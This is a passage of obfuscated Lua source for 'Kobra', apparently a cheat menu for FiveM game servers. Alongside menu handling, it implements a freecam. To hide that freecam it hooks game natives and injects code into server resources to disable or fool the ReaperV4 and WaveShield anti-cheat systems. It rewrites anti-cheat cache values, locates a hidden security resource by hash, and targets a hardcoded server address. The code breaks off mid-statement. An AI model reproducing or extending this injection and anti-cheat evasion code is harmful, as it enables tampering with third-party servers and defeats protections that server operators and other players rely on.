v183.min or 0 ;local v692=v183.step or 1 ;if (v182=="Left") then v183.value=math.max(v183.min or 0 ,v183.value-v692 );elseif (v182=="Right") then v183.value=math.min(v183.max or (1614 -(822 + 692)) ,v183.value + v692 );end for v761,v762 in pairs(v25) do if ((v762.type=="slider-checkbox") and (type(v762.value)~="nil") and (v762.label==v183.label)) then if (v182=="Left") then v762.value=math.max(v183.min or (0 -0) ,v183.value-v692 );elseif (v182=="Right") then v762.value=math.min(v183.max or 100 ,v183.value + v692 );else return;end end end v181:UpdateElements(v17);if ((v183.scrollType=="onScroll") and v183.onSelect) then if (v183.type=="slider-checkbox") then v183.onSelect(v183.value,v183.checked or false );else v183.onSelect(v183.value);end end end end;v12.Enter=function(v184) if ( not v17 or ( #v17==0)) then return;end local v185=v17[v15];if  not v185 then return;end if  not v24 then return;end if (v185.type=="subMenu") then table.insert(v20,{menu=v17,categories=v18,categoryIndex=v19});table.insert(v21,v185.label or "Submenu" );if (v185.type=="Server") then v12:UpdateListMenu();end if (v185.categories and (type(v185.categories)=="table") and ( #v185.categories>(0 + 0))) then v18=v185.categories;v19=1;v17=v18[v19].tabs or {} ;v15=298 -(45 + 252) ;v184:UpdateElements(v17);return;end if (v185.subTabs and (type(v185.subTabs)=="table") and ( #v185.subTabs>0)) then v18=nil;v19=1;v17=v185.subTabs;v15=1 + 0 ;v184:UpdateElements(v17);return;end return;end if ((v185.type=="button") and v185.onSelect and (type(v185.onSelect)=="function")) then local v525,v526=pcall(v185.onSelect);if  not v525 then v184:Debug("red","onSelect error: "   .. tostring(v526) );end return;end if ((v185.type=="checkbox") or (v185.type=="scrollable-checkbox") or (v185.type=="slider-checkbox")) then local v527=0 + 0 ;while true do if ((2 -1)==v527) then if (v185.onSelect and (type(v185.onSelect)=="function")) then if (v185.type=="scrollable-checkbox") then local v1065=433 -(114 + 319) ;local v1066;local v1067;while true do if (v1065==(0 -0)) then v1066,v1067=pcall(v185.onSelect,v185.values[v185.value],v185.checked);if  not v1066 then v184:Debug("red","scrollable-checkbox onSelect error: "   .. tostring(v1067) );end break;end end elseif (v185.type=="slider-checkbox") then local v1167=0 -0 ;local v1168;local v1169;while true do if (v1167==(0 + 0)) then v1168,v1169=pcall(v185.onSelect,v185.value,v185.checked);if  not v1168 then v184:Debug("red","slider-checkbox onSelect error: "   .. tostring(v1169) );end break;end end else local v1170=0;local v1171;local v1172;while true do if (v1170==(0 -0)) then v1171,v1172=pcall(v185.onSelect,v185.checked);if  not v1171 then v184:Debug("red","checkbox onSelect error: "   .. tostring(v1172) );end break;end end end end v184:UpdateElements(v17);v527=3 -1 ;end if (v527==(1963 -(556 + 1407))) then if v185.locked then local v874=1206 -(741 + 465) ;while true do if (v874==(465 -(170 + 295))) then v184:Notify("error","Kobra","This module has been disabled due to high detection rates!",3000);return;end end end if (type(v185.checked)~="boolean") then v185.checked=true;else v185.checked= not v185.checked;end v527=1;end if (v527==(2 + 0)) then return;end end end if ((v185.type=="scrollable") or (v185.type=="scrollable-checkbox")) then if (v185.values and (type(v185.values)=="table") and ( #v185.values>(0 + 0))) then if v185.onSelect then v185.onSelect(v185.values[v185.value]);end end return;end if ((v185.type=="slider") or (v185.type=="slider-checkbox")) then local v528=0 -0 ;while true do if (v528==(0 + 0)) then if ((v185.scrollType=="onEnter") and v185.onSelect) then if (v185.type=="slider-checkbox") then v185.onSelect(v185.value,v185.checked or false );else v185.onSelect(v185.value);end end return;end end end end;local v64=false;v12.Backspace=function(v186) if ( #v20>(0 + 0)) then local v529=table.remove(v20);table.remove(v21);v17=v529.menu or v16 ;v18=v529.categories;v19=v529.categoryIndex or 1 ;v15=1 + 0 ;v186:UpdateElements(v17);else v186:HideUI();end end;v12.PrevCategory=function(v187) if ( not v18 or ( #v18==0)) then return;end v19=v19-(1231 -(957 + 273)) ;if (v19<(1 + 0)) then v19= #v18;end v17=v18[v19].tabs or {} ;v15=1;v187:UpdateElements(v17);v187:SendMessage({action="keydown",index=v15-(1 + 0) });end;v12.NextCategory=function(v188) if ( not v18 or ( #v18==(0 -0))) then return;end v19=v19 + (2 -1) ;if (v19> #v18) then v19=2 -1 ;end v17=v18[v19].tabs or {} ;v15=4 -3 ;v188:UpdateElements(v17);v188:SendMessage({action="keydown",index=v15-(1781 -(389 + 1391)) });end;v12.ToggleFreecam=function(v189,v190,v191) if (type(v190)~="boolean") then return;end if v190 then v32=true;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=true,weaponIndex=v34,vehicleIndex=v35}));if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then MachoHookNative(5923634300000000000 -0 ,function(...) return false, -1;end);MachoHookNative(11673589000000000000 -(783 + 168) ,function(...) return false,GetEntityCoords(PlayerPedId());end);MachoHookNative(14327026000000000000 -1865851387 ,function(...) return false,false;end);MachoHookNative(10181871000000000000 -(10 + 35) ,function(...) return false,0 -0 ;end);MachoHookNative(12777102000000000000 -(1090 + 122) ,function(...) return false,false;end);MachoHookNative(1858573000000000000 -  -108036666 ,function(...) return false,0;end);MachoHookNative(15349248000000000000 -487656020 ,function(...) return false,0;end);MachoHookNative(18127728000000000000 -0 ,function(...) return false,true;end);MachoHookNative(11059360000000000000 -(1701 + 214) ,function(...) return false,true;end);_G.KobraFreecamSpeed=v191;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v1068,v1069) local v1070=_G[v1068];if ( not v1070 or (type(v1070)~="function")) then return;end _G[v1068]=function(...) return v1069(v1070,...);end;end local function v987(v1071) local v1072=math.rad(v1071.z);local v1073=math.rad(v1071.x);local v1074=math.abs(math.cos(v1073));return vector3( -math.sin(v1072) * v1074 ,math.cos(v1072) * v1074 ,math.sin(v1073));end local function v988(v1075) local v1076=math.rad(v1075.z);return vector3(math.cos(v1076),math.sin(v1076),0);end local function v989(v1077,v1078,v1079) if (v1077<v1078) then return v1078;end if (v1077>v1079) then return v1079;end return v1077;end hNative("RotationToDirection",function(v1080,...) return v1080(...);end);hNative("GetRightVector",function(v1081,...) return v1081(...);end);hNative("Clamp",function(v1082,...) return v1082(...);end);hNative("CreateThread",function(v1083,...) return v1083(...);end);hNative("Wait",function(v1084,...) return v1084(...);end);hNative("IsVehicleSeatFree",function(v1085,...) return v1085(...);end);hNative("PlayerPedId",function(v1086,...) return v1086(...);end);hNative("GetEntityCoords",function(v1087,...) return v1087(...);end);hNative("CreateCam",function(v1088,...) return v1088(...);end);hNative("DoesCamExist",function(v1089,...) return v1089(...);end);hNative("SetCamCoord",function(v1090,...) return v1090(...);end);hNative("SetCamRot",function(v1091,...) return v1091(...);end);hNative("RenderScriptCams",function(v1092,...) return v1092(...);end);hNative("DestroyCam",function(v1093,...) return v1093(...);end);hNative("SetFocusEntity",function(v1094,...) return v1094(...);end);hNative("SetTextFont",function(v1095,...) return v1095(...);end);hNative("SetTextProportional",function(v1096,...) return v1096(...);end);hNative("SetTextScale",function(v1097,...) return v1097(...);end);hNative("SetTextDropShadow",function(v1098,...) return v1098(...);end);hNative("SetTextEdge",function(v1099,...) return v1099(...);end);hNative("SetTextOutline",function(v1100,...) return v1100(...);end);hNative("SetTextCentre",function(v1101,...) return v1101(...);end);hNative("SetTextColour",function(v1102,...) return v1102(...);end);hNative("BeginTextCommandDisplayText",function(v1103,...) return v1103(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1104,...) return v1104(...);end);hNative("EndTextCommandDisplayText",function(v1105,...) return v1105(...);end);hNative("GetCamCoord",function(v1106,...) return v1106(...);end);hNative("GetCamRot",function(v1107,...) return v1107(...);end);hNative("IsControlPressed",function(v1108,...) return v1108(...);end);hNative("GetDisabledControlNormal",function(v1109,...) return v1109(...);end);hNative("TaskStandStill",function(v1110,...) return v1110(...);end);hNative("SetFocusPosAndVel",function(v1111,...) return v1111(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1112,...) return v1112(...);end);hNative("GetShapeTestResult",function(v1113,...) return v1113(...);end);hNative("IsControlJustPressed",function(v1114,...) return v1114(...);end);hNative("IsDisabledControlJustPressed",function(v1115,...) return v1115(...);end);hNative("IsEntityAVehicle",function(v1116,...) return v1116(...);end);hNative("TaskWarpPedIntoVehicle",function(v1117,...) return v1117(...);end);hNative("SetEntityCoords",function(v1118,...) return v1118(...);end);hNative("GiveWeaponToPed",function(v1119,...) return v1119(...);end);hNative("SetCurrentPedWeapon",function(v1120,...) return v1120(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1121,...) return v1121(...);end);local v990=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v990.x,v990.y,v990.z + 2 );SetCamRot(_G.KobraFreecamObject,1774 -(113 + 1661) ,0,GetEntityHeading(PlayerPedId()),1 + 1 );RenderScriptCams(true,false,0 -0 ,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(0 -0 );if _G.KobraFreecamObject then local v1204=GetCamCoord(_G.KobraFreecamObject);local v1205=GetCamRot(_G.KobraFreecamObject,2);local v1206=_G.KobraFreecamSpeed or 0.25 ;local v1207=(IsControlPressed(0 + 0 ,3 + 18 ) and (v1206 + (1696 -(556 + 1139)))) or v1206 ;local v1208=v987(v1205);local v1209=v988(v1205);local v1210,v1211,v1212=15 -(6 + 9) ,0 + 0 ,0;TaskStandStill(PlayerPedId(),6 + 4 );SetFocusPosAndVel(v1204.x,v1204.y,v1204.z,169 -(28 + 141) ,0,0 + 0 );if IsControlPressed(0 -0 ,23 + 9 ) then v1210=v1210 + (v1208.x * v1207) ;v1211=v1211 + (v1208.y * v1207) ;v1212=v1212 + (v1208.z * v1207) ;end if IsControlPressed(0,1350 -(486 + 831) ) then local v1296=0 -0 ;while true do if (v1296==(0 -0)) then v1210=v1210-(v1208.x * v1207) ;v1211=v1211-(v1208.y * v1207) ;v1296=1 + 0 ;end if (v1296==1) then v1212=v1212-(v1208.z * v1207) ;break;end end end if IsControlPressed(0 -0 ,1297 -(668 + 595) ) then local v1297=0;while true do if (v1297==0) then v1210=v1210-(v1209.x * v1207) ;v1211=v1211-(v1209.y * v1207) ;break;end end end if IsControlPressed(0 + 0 ,35) then v1210=v1210 + (v1209.x * v1207) ;v1211=v1211 + (v1209.y * v1207) ;end if IsControlPressed(0 + 0 ,59 -37 ) then v1212=v1212 + v1207 ;end if IsControlPressed(290 -(23 + 267) ,36) then v1212=v1212-v1207 ;end SetCamCoord(_G.KobraFreecamObject,v1204.x + v1210 ,v1204.y + v1211 ,v1204.z + v1212 );local v1213=GetDisabledControlNormal(0,1945 -(1129 + 815) );local v1214=GetDisabledControlNormal(387 -(371 + 16) ,1752 -(1326 + 424) );local v1215=v989(v1205.x-(v1214 * 5) , -(168 -79),325 -236 );local v1216=v1205.z-(v1213 * (123 -(88 + 30))) ;SetCamRot(_G.KobraFreecamObject,v1215,v1205.y,v1216,2);end end end);else _G.KobraFreecamEnabled=true;end else v49(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                print("hello im inside of a resource")
                    _G.KobraFreecamSpeed = ]]   .. v191   .. [[

                    if not _G.KobraFreecamThreadRunning then
                        _G.KobraFreecamEnabled = true
                        _G.KobraFreecamThreadRunning = true
                    
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        local function RotationToDirection(rot)
                            local z = math.rad(rot.z)
                            local x = math.rad(rot.x)
                            local num = math.abs(math.cos(x))
                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                        end

                        local function GetRightVector(rot)
                            local z = math.rad(rot.z)
                            return vector3(math.cos(z), math.sin(z), 0.0)
                        end

                        local function Clamp(val, min, max)
                            if val < min then return min end
                            if val > max then return max end
                            return val
                        end

                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                        local coords = GetEntityCoords(PlayerPedId())
                        _G.KobraFreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                        SetCamCoord(_G.KobraFreecamObject, coords.x, coords.y, coords.z + 2.0)
                        SetCamRot(_G.KobraFreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                        RenderScriptCams(true, false, 0, true, true)
                        
                        CreateThread(function()
                            while _G.KobraFreecamThreadRunning do
                                Wait(0)

                                if _G.KobraFreecamObject then
                                    local coords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local beforeSpeed = _G.KobraFreecamSpeed or 0.25
                                    local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                                    local forward = RotationToDirection(rot)
                                    local right = GetRightVector(rot)
                                    local moveX, moveY, moveZ = 0, 0, 0

                                    TaskStandStill(PlayerPedId(), 10)
                                    SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                    if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                                    if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                                    if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                                    if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                                    if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                                    if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                                    SetCamCoord(_G.KobraFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                                    local x = GetDisabledControlNormal(0, 1)
                                    local y = GetDisabledControlNormal(0, 2)
                                    local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                                    local newYaw = rot.z - x * 5

                                    SetCamRot(_G.KobraFreecamObject, newPitch, rot.y, newYaw, 2)
                                end
                            end
                        end)
                    else
                        _G.KobraFreecamEnabled = true
                    end
                ]] );end else if  not v30 then local v837=0;local v838;local v839;while true do if (v837==(774 -(720 + 51))) then if v839 then MachoInjectResource(v839,[[
                        _G["GetRenderingCam"] = function()
                            return 0
                        end

                        _G["GetDistanceBetweenCoords"] = function()
                            return 0
                        end
                    ]]);end MachoInjectResource("any",[[
                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "player_loaded", false, true)
                    if success then
                        print("Updated Cache 1 Successfully")
                    else
                        print("Failed to Update Cache 1")
                    end

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "LastFailedMovementChecks", 0, true)
                    if success then
                        print("Updated Cache 2 Successfully")
                    else
                        print("Failed to Update 2 Cache")
                    end

                    Wait(500)

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "NetworkIsInSpectatorMode", true, true)
                    if success then
                        print("Updated Cache 3 Successfully")
                    else
                        print("Failed to Update Cache 3")
                    end
                ]]);v837=4;end if ((0 -0)==v837) then print("[^5Kobra^7]: [^3DEBUG^7] >> Loading ReaperV4 Freecam Bypass");v838=nil;v837=1777 -(421 + 1355) ;end if (v837==(6 -2)) then print("[^5Kobra^7]: [^2DEBUG^7] >> Loaded ReaperV4 Freecam Bypass");v30=true;break;end if (2==v837) then MachoInjectResource("ReaperV4",[[
                    _G["GetRenderingCam"] = function()
                        return 0
                    end

                    _G["GetDistanceBetweenCoords"] = function()
                        return 0
                    end
                ]]);Wait(123 + 127 );v837=1086 -(286 + 797) ;end if (v837==(3 -2)) then function v838() local v1134=false;local function v1135(v1173,v1174) local v1175=0 -0 ;local v1176;while true do if (v1175==(440 -(397 + 42))) then v1176=1681 + 3700 ;for v1307=801 -(24 + 776) , #v1173 do local v1308=string.byte(v1173,v1307);v1176=(v1176 * (50 -17))~v1308 ;end v1175=2;end if (v1175==(787 -(222 + 563))) then return v1176;end if (v1175==(0 -0)) then v1174=v1174 or "072b0945-fdd6d8bb-2e1d0476-d15c8f4b-ed6db3e1" ;v1173=v1173   .. v1174 ;v1175=1 + 0 ;end end end local v1136=GetConvar("reaper_security_resource","");local v1137=tonumber(v1136);if  not v1137 then return;end local v1138=GetNumResources() or (190 -(23 + 167)) ;local v1139={};for v1177=1798 -(690 + 1108) ,v1138-(1 + 0)  do local v1178=GetResourceByFindIndex(v1177);if (v1178 and (v1178~="")) then table.insert(v1139,v1178);end end if ( #v1139==0) then return;end local v1140=0 + 0 ;local v1141=nil;for v1179,v1180 in ipairs(v1139) do v1140=v1140 + 1 ;if (v1135(v1180)==v1137) then print("^7[^5Kobra^7]: [^3DEBUG^7]: Reaper Security Resource Found: "   .. v1180 );v1141=v1180;break;end local v1181=v1180:gsub("[-_]","");if ((v1181~=v1180) and (v1135(v1181)==v1137)) then v1141=v1181;break;end if ((v1140%(898 -(40 + 808)))==0) then Wait(0 + 0 );end end if v1141 then return v1141;end end v839=v838();v837=7 -5 ;end end end _G.KobraFreecamSpeed=v191;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v877,v878) local v879=0 + 0 ;local v880;while true do if (v879==1) then _G[v877]=function(...) return v878(v880,...);end;break;end if (v879==(0 + 0)) then v880=_G[v877];if ( not v880 or (type(v880)~="function")) then return;end v879=1 + 0 ;end end end local function v840(v881) local v882=571 -(47 + 524) ;local v883;local v884;local v885;while true do if (v882==(1 + 0)) then v885=math.abs(math.cos(v884));return vector3( -math.sin(v883) * v885 ,math.cos(v883) * v885 ,math.sin(v884));end if (v882==0) then v883=math.rad(v881.z);v884=math.rad(v881.x);v882=2 -1 ;end end end local function v841(v886) local v887=0 -0 ;local v888;while true do if (v887==(0 -0)) then v888=math.rad(v886.z);return vector3(math.cos(v888),math.sin(v888),0);end end end local function v842(v889,v890,v891) local v892=1726 -(1165 + 561) ;while true do if (v892==(1 + 0)) then return v889;end if (v892==(0 -0)) then if (v889<v890) then return v890;end if (v889>v891) then return v891;end v892=1;end end end hNative("RotationToDirection",function(v893,...) return v893(...);end);hNative("GetRightVector",function(v894,...) return v894(...);end);hNative("Clamp",function(v895,...) return v895(...);end);hNative("CreateThread",function(v896,...) return v896(...);end);hNative("Wait",function(v897,...) return v897(...);end);hNative("IsVehicleSeatFree",function(v898,...) return v898(...);end);hNative("PlayerPedId",function(v899,...) return v899(...);end);hNative("GetEntityCoords",function(v900,...) return v900(...);end);hNative("CreateCam",function(v901,...) return v901(...);end);hNative("DoesCamExist",function(v902,...) return v902(...);end);hNative("SetCamCoord",function(v903,...) return v903(...);end);hNative("SetCamRot",function(v904,...) return v904(...);end);hNative("RenderScriptCams",function(v905,...) return v905(...);end);hNative("DestroyCam",function(v906,...) return v906(...);end);hNative("SetFocusEntity",function(v907,...) return v907(...);end);hNative("SetTextFont",function(v908,...) return v908(...);end);hNative("SetTextProportional",function(v909,...) return v909(...);end);hNative("SetTextScale",function(v910,...) return v910(...);end);hNative("SetTextDropShadow",function(v911,...) return v911(...);end);hNative("SetTextEdge",function(v912,...) return v912(...);end);hNative("SetTextOutline",function(v913,...) return v913(...);end);hNative("SetTextCentre",function(v914,...) return v914(...);end);hNative("SetTextColour",function(v915,...) return v915(...);end);hNative("BeginTextCommandDisplayText",function(v916,...) return v916(...);end);hNative("AddTextComponentSubstringPlayerName",function(v917,...) return v917(...);end);hNative("EndTextCommandDisplayText",function(v918,...) return v918(...);end);hNative("GetCamCoord",function(v919,...) return v919(...);end);hNative("GetCamRot",function(v920,...) return v920(...);end);hNative("IsControlPressed",function(v921,...) return v921(...);end);hNative("GetDisabledControlNormal",function(v922,...) return v922(...);end);hNative("TaskStandStill",function(v923,...) return v923(...);end);hNative("SetFocusPosAndVel",function(v924,...) return v924(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v925,...) return v925(...);end);hNative("GetShapeTestResult",function(v926,...) return v926(...);end);hNative("IsControlJustPressed",function(v927,...) return v927(...);end);hNative("IsDisabledControlJustPressed",function(v928,...) return v928(...);end);hNative("IsEntityAVehicle",function(v929,...) return v929(...);end);hNative("TaskWarpPedIntoVehicle",function(v930,...) return v930(...);end);hNative("SetEntityCoords",function(v931,...) return v931(...);end);hNative("GiveWeaponToPed",function(v932,...) return v932(...);end);hNative("SetCurrentPedWeapon",function(v933,...) return v933(...);end);hNative("ShootSingleBulletBetweenCoords",function(v934,...) return v934(...);end);local v843=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v843.x,v843.y,v843.z + 1 + 1 );SetCamRot(_G.KobraFreecamObject,0,479 -(341 + 138) ,GetEntityHeading(PlayerPedId()),1 + 1 );RenderScriptCams(true,false,0 -0 ,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(0);if (_G.KobraFreecamEnabled and _G.KobraFreecamObject) then local v1142=326 -(89 + 237) ;local v1143;local v1144;local v1145;local v1146;local v1147;local v1148;local v1149;local v1150;local v1151;local v1152;local v1153;local v1154;local v1155;while true do if ((16 -11)==v1142) then SetCamCoord(_G.KobraFreecamObject,v1143.x + v1149 ,v1143.y + v1150 ,v1143.z + v1151 );v1152=GetDisabledControlNormal(0,1 -0 );v1153=GetDisabledControlNormal(881 -(581 + 300) ,1222 -(855 + 365) );v1142=13 -7 ;end if (v1142==(2 + 2)) then if IsControlPressed(0,1270 -(1030 + 205) ) then local v1309=0 + 0 ;while true do if (v1309==(0 + 0)) then v1149=v1149 + (v1148.x * v1146) ;v1150=v1150 + (v1148.y * v1146) ;break;end end end if IsControlPressed(286 -(156 + 130) ,22) then v1151=v1151 + v1146 ;end if IsControlPressed(0 -0 ,36) then v1151=v1151-v1146 ;end v1142=8 -3 ;end if (v1142==(5 -2)) then if IsControlPressed(0,9 + 23 ) then local v1310=0 + 0 ;while true do if (v1310==(70 -(10 + 59))) then v1151=v1151 + (v1147.z * v1146) ;break;end if (v1310==0) then v1149=v1149 + (v1147.x * v1146) ;v1150=v1150 + (v1147.y * v1146) ;v1310=1;end end end if IsControlPressed(0 + 0 ,33) then local v1311=0;while true do if (v1311==(4 -3)) then v1151=v1151-(v1147.z * v1146) ;break;end if (v1311==0) then v1149=v1149-(v1147.x * v1146) ;v1150=v1150-(v1147.y * v1146) ;v1311=1;end end end if IsControlPressed(1163 -(671 + 492) ,28 + 6 ) then v1149=v1149-(v1148.x * v1146) ;v1150=v1150-(v1148.y * v1146) ;end v1142=1219 -(369 + 846) ;end if (v1142==2) then v1149,v1150,v1151=0 + 0 ,0,0;TaskStandStill(PlayerPedId(),10);SetFocusPosAndVel(v1143.x,v1143.y,v1143.z,0 + 0 ,1945 -(1036 + 909) ,0 + 0 );v1142=4 -1 ;end if (v1142==1) then v1146=(IsControlPressed(0,224 -(11 + 192) ) and (v1145 + 1)) or v1145 ;v1147=v840(v1144);v1148=v841(v1144);v1142=2 + 0 ;end if ((175 -(135 + 40))==v1142) then v1143=GetCamCoord(_G.KobraFreecamObject);v1144=GetCamRot(_G.KobraFreecamObject,4 -2 );v1145=_G.KobraFreecamSpeed or 0.25 ;v1142=1 + 0 ;end if ((12 -6)==v1142) then v1154=v842(v1144.x-(v1153 * (7 -2)) , -(265 -(50 + 126)),247 -158 );v1155=v1144.z-(v1152 * (2 + 3)) ;SetCamRot(_G.KobraFreecamObject,v1154,v1144.y,v1155,2);break;end end end end end);else _G.KobraFreecamEnabled=true;end end else local v531=1413 -(1233 + 180) ;while true do if (v531==(969 -(522 + 447))) then v32=false;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=false}));v531=1422 -(107 + 1314) ;end if (v531==(1 + 0)) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then local v1122=0;while true do if ((27 -18)==v1122) then hNative("TaskWarpPedIntoVehicle",function(v1223,...) return v1223(...);end);hNative("SetEntityCoords",function(v1224,...) return v1224(...);end);hNative("GiveWeaponToPed",function(v1225,...) return v1225(...);end);hNative("SetCurrentPedWeapon",function(v1226,...) return v1226(...);end);v1122=5 + 5 ;end if (v1122==8) then hNative("GetShapeTestResult",function(v1227,...) return v1227(...);end);hNative("IsControlJustPressed",function(v1228,...) return v1228(...);end);hNative("IsDisabledControlJustPressed",function(v1229,...) return v1229(...);end);hNative("IsEntityAVehicle",function(v1230,...) return v1230(...);end);v1122=17 -8 ;end if (v1122==6) then hNative("EndTextCommandDisplayText",function(v1231,...) return v1231(...);end);hNative("GetCamCoord",function(v1232,...) return v1232(...);end);hNative("GetCamRot",function(v1233,...) return v1233(...);end);hNative("IsControlPressed",function(v1234,...) return v1234(...);end);v1122=27 -20 ;end if (v1122==(1912 -(716 + 1194))) then hNative("CreateCam",function(v1235,...) return v1235(...);end);hNative("SetCamCoord",function(v1236,...) return v1236(...);end);hNative("SetCamRot",function(v1237,...) return v1237(...);end);hNative("RenderScriptCams",function(v1238,...) return v1238(...);end);v1122=1 + 2 ;end if (v1122==5) then hNative("SetTextCentre",function(v1239,...) return v1239(...);end);hNative("SetTextColour",function(v1240,...) return v1240(...);end);hNative("BeginTextCommandDisplayText",function(v1241,...) return v1241(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1242,...) return v1242(...);end);v1122=6;end if (v1122==(1 + 6)) then hNative("GetDisabledControlNormal",function(v1243,...) return v1243(...);end);hNative("TaskStandStill",function(v1244,...) return v1244(...);end);hNative("SetFocusPosAndVel",function(v1245,...) return v1245(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1246,...) return v1246(...);end);v1122=8;end if (3==v1122) then hNative("DestroyCam",function(v1247,...) return v1247(...);end);hNative("SetFocusEntity",function(v1248,...) return v1248(...);end);hNative("SetTextFont",function(v1249,...) return v1249(...);end);hNative("SetTextProportional",function(v1250,...) return v1250(...);end);v1122=507 -(74 + 429) ;end if (v1122==0) then _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v1251,v1252) local v1253=_G[v1251];if ( not v1253 or (type(v1253)~="function")) then return;end _G[v1251]=function(...) return v1252(v1253,...);end;end hNative("CreateThread",function(v1254,...) return v1254(...);end);v1122=1;end if (v1122==(7 -3)) then hNative("SetTextScale",function(v1255,...) return v1255(...);end);hNative("SetTextDropShadow",function(v1256,...) return v1256(...);end);hNative("SetTextEdge",function(v1257,...) return v1257(...);end);hNative("SetTextOutline",function(v1258,...) return v1258(...);end);v1122=5;end if (v1122==(1 + 0)) then hNative("Wait",function(v1259,...) return v1259(...);end);hNative("IsVehicleSeatFree",function(v1260,...) return 